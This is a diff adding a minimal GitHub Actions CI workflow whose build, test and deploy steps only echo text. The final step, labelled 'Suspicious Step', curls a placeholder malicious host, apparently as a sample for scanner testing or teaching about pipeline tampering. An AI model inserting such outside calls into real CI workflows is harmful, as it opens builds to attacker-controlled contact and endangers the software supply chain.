@@ -1,0 +1,24 @@
+name: CI Pipeline
+
+on: [push]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+
+      - name: Build Step
+        run: echo "Building project..."
+
+      - name: Test Step
+        run: echo "Running tests..."
+
+      - name: Deploy Step
+        run: echo "Deploying app..."
+
+      # 🔥 Important for your project
+      - name: Suspicious Step
+        run: curl http://malicious-site.com
